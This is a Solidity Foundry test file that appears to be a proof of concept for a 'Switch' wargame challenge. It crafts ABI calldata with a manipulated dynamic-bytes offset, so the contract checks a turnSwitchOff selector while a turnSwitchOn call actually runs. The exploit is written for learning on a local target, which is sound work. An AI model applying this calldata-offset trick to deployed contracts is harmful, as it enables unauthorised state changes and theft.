// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {Switch} from "src/Switch.sol";

contract Switch_POC is Test {
    Switch _switch;
    function init() private{
        vm.startPrank(address(0x10));
        _switch = new Switch();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }
    function test_Switch_POC() public{
        bytes4 Off_Selector = bytes4(keccak256("turnSwitchOff()"));
        bytes4 On_Selector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 Switch_Selector = bytes4(keccak256("flipSwitch(bytes)"));
        /*
        Switch_Selector
    4    0x0000000000000000000000000000000000000000000000000000000000000060   (100-4)
    36   0x0000000000000000000000000000000000000000000000000000000000000000
    68   Off_Selector+0x00000000000000000000000000000000000000000000000000000000
    100  0x0000000000000000000000000000000000000000000000000000000000000004
         On_Selector
        */
        bytes memory data = abi.encode(0x0000000000000000000000000000000000000000000000000000000000000060,0x0000000000000000000000000000000000000000000000000000000000000000,Off_Selector,0x0000000000000000000000000000000000000000000000000000000000000004,On_Selector);
        data = abi.encodePacked(Switch_Selector,data);
        console.logBytes(data);
        address(_switch).call(data);

        console.log("Success:",_switch.switchOn());

    }
        
}